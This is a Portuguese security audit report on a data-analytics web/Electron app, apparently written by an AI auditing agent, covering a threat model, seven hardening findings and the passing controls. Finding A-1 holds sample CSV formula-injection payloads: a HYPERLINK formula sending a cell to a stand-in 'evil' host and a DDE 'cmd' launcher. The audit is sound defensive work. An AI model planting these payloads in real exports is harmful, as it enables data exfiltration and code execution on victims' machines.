# 05 — Auditoria de Segurança — IA Analytics Pro

Auditor: CyberSec (Squad) · Data: 2026-07-10 · Escopo: código real do repositório `c:\Project\analise-dados` (rotas de API, libs de análise/conectores, Electron, `next.config.ts`, dependências). Nenhum arquivo fora de `analise-melhorias/` foi alterado. Único comando executado: `npm audit --omit=dev` (read-only).

---

## 1. Modelo de ameaças (resumo)

Ativo a proteger, em ordem: **(1)** os dados brutos do usuário (invariante "Privacidade Absoluta" — nunca podem sair para terceiros); **(2)** a `GEMINI_API_KEY`; **(3)** a integridade do host (rotas que sobem processos / conectam a bancos).

Superfícies de ataque:
- **Rede → rotas de IA** (`/api/analyze/local|cloud`): payload malicioso tentando embutir linhas brutas para vazá-las ao Gemini.
- **Rede → rotas que tocam o SO** (`/api/ollama/install|start|pull`): injeção de comando, acionamento remoto num deploy.
- **Rede → conectores de banco** (`/api/db/tables|rows`): injeção SQL por identificador, SSRF para rede interna.
- **Conteúdo hostil** (planilha/SQLite/`.iaap` de terceiros): XSS via nomes/valores renderizados, prototype pollution no parse, CSV/formula injection na exportação.
- **Desktop (Electron)**: escape do renderer, navegação para origem externa.
- **Cadeia de suprimentos**: `xlsx` (CVE conhecido no pacote npm), transitivas do Next.

Postura geral encontrada: **madura**. A invariante de privacidade é imposta por construção (allowlist positiva), não só prometida. Os achados abaixo são residuais/defensivos — nenhum crítico ou alto.

---

## 2. Achados

### A-1 (MÉDIO) — CSV/Formula injection na exportação
`lib/dashboard-utils.ts` → `rowsToCsv()` faz o escaping correto de CSV (aspas/`;`/quebra de linha) mas **não neutraliza gatilhos de fórmula**. Uma célula cujo valor começa com `=`, `+`, `-`, `@`, TAB ou CR é escrita como está; ao abrir o CSV no Excel/LibreOffice a fórmula é avaliada.

- PoC conceitual: um dataset de terceiro (cenário real do produto — usuário do tipo "PowerBI" abre planilhas alheias) contém a célula `=HYPERLINK("http://evil/"&A1,"clique")` ou `=cmd|'/c calc'!A1`. O app exporta o CSV filtrado; a vítima abre no Excel → execução/exfiltração.
- É o caminho de saída mais explorável porque o app existe justamente para consumir dados de origem não confiável.
- **Recomendação**: prefixar com apóstrofo (`'`) ou aspa qualquer campo de texto que comece com `= + - @ TAB CR`, dentro do `escape()`. Correção de ~3 linhas, sem impacto no fluxo normal.

### A-2 (MÉDIO) — SSRF residual quando `ALLOW_REMOTE_DB=1`
`/api/db/tables|rows` recebem uma `connectionString` **crua** e a repassam aos drivers (`pg`/`mysql2`/`mssql`) sem validar host/porta/esquema. Em desktop (localhost) é aceitável. Num deploy público com `ALLOW_REMOTE_DB=1`, qualquer requester vira um proxy para conectar/varrer a rede interna do host (metadados de nuvem, serviços internos).

- Já é **opt-in explícito e documentado** (`SECURITY.md §4`, ADR do gate) — por isso MÉDIO e não ALTO; a mitigação atual é "não ligue a flag num deploy exposto".
- **Recomendação**: se o modo remoto for realmente usado, adicionar allowlist de hosts/portas de banco e bloquear faixas privadas/link-local por default; manter aviso forte na doc. Para o uso atual (desktop) nenhuma ação é bloqueante.

### A-3 (BAIXO/MÉDIO) — CSP com `'unsafe-inline'` em `script-src`
`next.config.ts` mantém `'unsafe-inline'` (e `'unsafe-eval'` só em dev) em `script-src`. Reduz o valor da CSP como segunda barreira contra XSS. Mitigado por: `default-src 'self'`, ausência de origens de terceiros, e React escapando saída por padrão. Já registrado como endurecimento futuro (SEC-3: nonce por middleware).
- **Recomendação**: implementar nonce por requisição para remover `'unsafe-inline'` de `script-src`. Não bloqueante.

### A-4 (BAIXO) — Gate `isLocalRequest` forjável em exposição direta
`lib/server-guards.ts` valida o **valor** de `Host`/`X-Forwarded-*`/`Forwarded` (correto, e a nota explica por que não dá para usar a mera presença). Limitação residual **já documentada**: um atacante com acesso HTTP cru direto (servidor exposto sem proxy) pode forjar `Host: localhost` + `X-Forwarded-For: 127.0.0.1`. Para o alvo (app desktop em `127.0.0.1`) o risco é baixo; a defesa correta é não expor a porta. Aceitável como está.

### A-5 (BAIXO) — Electron sem handler de navegação (`will-navigate`)
`electron/main.cjs` está bem configurado (`contextIsolation:true`, `nodeIntegration:false`, `sandbox:true`, `setWindowOpenHandler` nega e abre externo no navegador). Falta um handler `will-navigate`/`web-contents-created` que impeça o próprio `webContents` de navegar para uma origem externa (defesa em profundidade caso um XSS force `location=`). Baixo, pois o conteúdo é local e a CSP restringe.
- **Recomendação**: bloquear `will-navigate` para URLs fora de `APP_URL`.

### A-6 (BAIXO) — `npm audit`: 2 moderadas transitivas (postcss via Next)
`npm audit --omit=dev` em 2026-07-10: **0 críticas, 0 altas, 2 moderadas**. Ambas são `postcss <8.5.10` (GHSA-qx2v-qp2m-jg93, XSS no stringify de CSS) puxado transitivamente pelo `next`; o único fix do audit é `--force` para `next@9.3.3` (breaking, inaceitável). Corresponde ao que `SECURITY.md §6` já declara. Não explorável no fluxo do app (não processamos CSS de terceiros em runtime).
- **Recomendação**: acompanhar releases do Next que subam o postcss; nenhuma ação bloqueante.

### A-7 (BAIXO/INFORMATIVO) — Prototype pollution local em `sanitizeImportedFilters`
`lib/dashboard-storage.ts` atribui `out.categories[column] = ...` com `column` vindo de JSON não confiável (`.iaap`). Uma chave `"__proto__"` afetaria apenas o **protótipo daquele objeto local** (não `Object.prototype` global) e o valor é sempre coagido a `string[]`. Sem impacto global. O restante do parse (`sanitizeImportedChart`, `parseFileContent`) reconstrói por objeto-literal com tetos de tamanho — sólido.
- **Recomendação (higiene)**: pular chaves `__proto__`/`constructor`/`prototype` no laço de `Object.entries`. Opcional.

---

## 3. Verificações que PASSARAM (controles que funcionam)

- **Privacidade Absoluta — imposta por construção**: `validateMetadataPayload` (`lib/analysis.ts`) reconstrói o `DatasetMetadata` campo a campo por **allowlist positiva** (`reconstructMetadata`/`reconstructColumn`) — nenhuma chave desconhecida sobrevive, independente do scan. O `findForbiddenKeyDeep` (rows/data/values/records/sampleRows/cells…, case-insensitive, recursivo) é camada extra de erro cedo. Aplicada **nas duas** rotas de análise **antes** de tocar rede/chave. Não achei caminho que leve linha bruta ao Gemini/Ollama: o prompt (`prompt-builder.ts`) só serializa o metadado; o `context` é texto livre do usuário capado em 280 chars; a persistência é 100% local (IndexedDB/localStorage).
- **Anti-injeção/alucinação**: `normalizeCharts` descarta specs cujo `xKey`/`yKeys` não estão no esquema real — confirmado.
- **Rotas que tocam o SO**: comandos **fixos** em array (`winget install --id Ollama.Ollama …`, `ollama serve`), sem interpolação de input; `/api/ollama/pull` valida o nome de modelo por regex allowlist (`^[a-zA-Z0-9._:/-]{1,80}$`) e usa a API HTTP do Ollama, não shell; todas com gate `isLocalRequest` e timeout.
- **Conectores de banco**: identificadores **revalidados contra a introspecção** (`assertKnownTable`) antes de qualquer quoting por dialeto; `SELECT` sempre com teto (`clampLimit`, 1..50k); timeouts de conexão/consulta; erros saneados (`safeDbErrorMessage` remove URIs); listeners `on("error")` evitam derrubar o processo.
- **Segredos**: `GEMINI_API_KEY` lida só via `process.env` server-side; nenhum `NEXT_PUBLIC_*` com segredo; erros nunca ecoam a chave ao cliente (`logServerError` só no `console.error` do servidor). `.env.local` confirmado **gitignorado** e **não rastreado** (`git ls-files` = 0 ocorrências).
- **Dependências**: `xlsx` vem do **tarball oficial SheetJS 0.20.3** (`cdn.sheetjs.com`), evitando o CVE high do pacote npm 0.18.5 — confirmado em `package.json`.
- **XSS**: o único `dangerouslySetInnerHTML` (`app/layout.tsx`) injeta uma **constante estática** (script anti-flash de tema), sem input do usuário. Nomes/valores de coluna são renderizados por React (escapados).
- **Electron**: isolamento correto e links externos delegados ao navegador.
- **Headers**: `default-src 'self'`, `frame-ancestors 'none'`, `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy: no-referrer`, `Permissions-Policy` negando câmera/mic/geo.

---

## 4. Veredito

**SEM VETO.** A invariante central (Privacidade Absoluta) está imposta estruturalmente e não encontrei caminho de vazamento de dados brutos; segredos, injeção de comando/SQL e configuração do Electron estão corretos; `npm audit --omit=dev` sem críticas/altas. Nenhum achado é crítico ou alto — o release não fica bloqueado.

Os achados são de endurecimento; recomendo tratar **A-1 (CSV/formula injection)** na próxima janela por ser o único explorável por dado de terceiro com correção barata, e revisitar A-2/A-3 **antes** de qualquer deploy público com bancos remotos.

Contagem: **Crítico 0 · Alto 0 · Médio 3 (A-1, A-2, A-3) · Baixo 4 (A-4, A-5, A-6, A-7)**.
